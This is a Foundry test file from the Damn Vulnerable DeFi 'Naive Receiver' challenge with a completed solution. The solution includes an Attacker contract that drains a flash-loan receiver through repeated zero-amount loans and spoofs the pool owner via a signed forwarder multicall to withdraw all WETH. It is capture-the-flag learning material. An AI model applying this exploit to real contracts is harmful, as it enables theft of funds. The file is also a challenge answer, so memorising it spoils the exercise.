// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(0x48f5c3ed);
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {

        bytes[] memory multicallData = new bytes[](2);
        multicallData[0] = abi.encodePacked(
            abi.encodeCall(
                NaiveReceiverPool.withdraw,
                (WETH_IN_POOL, payable(recovery))
            ),
            deployer
        );
    
        multicallData[1] = abi.encodePacked(
            abi.encodeCall(
                NaiveReceiverPool.withdraw,
                (WETH_IN_RECEIVER, payable(recovery))
            ),
            pool.feeReceiver()
        );
    
        // Prepare the forwarder request
        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: player,
            target: address(pool),
            value: 0,
            gas: 500000,
            nonce: forwarder.nonces(player),
            data: abi.encodeCall(Multicall.multicall, (multicallData)),
            deadline: block.timestamp + 1 hours
        });
    
        // Calculate the request hash
        bytes32 digest = forwarder.getDataHash(request);
    
        digest = keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), digest));
        
        // Sign the request
        (uint8 v,  bytes32 r,  bytes32 s) = vm.sign(playerPk, digest);
        bytes memory signature = abi.encodePacked(r, s, v);

        Attacker attacker = new Attacker(pool, receiver, forwarder);
        attacker.saveguardFunds(signature, request);


    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");

        // Pool is empty too
        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");

        // All funds sent to recovery account
        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
    }
}


contract Attacker {

    NaiveReceiverPool immutable private pool;
    FlashLoanReceiver immutable private receiver;
    BasicForwarder immutable private forwarder;

    constructor(NaiveReceiverPool _pool, FlashLoanReceiver _receiver, BasicForwarder _forwarder) {
        pool = _pool;
        receiver = _receiver;
        forwarder = _forwarder;
    }

    function saveguardFunds(bytes memory signature, BasicForwarder.Request memory request) external {
        
        while(pool.weth().balanceOf(address(receiver)) > 0) {
            pool.flashLoan(receiver, address(pool.weth()), 0, "");
        }
    
        // Execute the forwarder request
        forwarder.execute(request, signature);
    }
}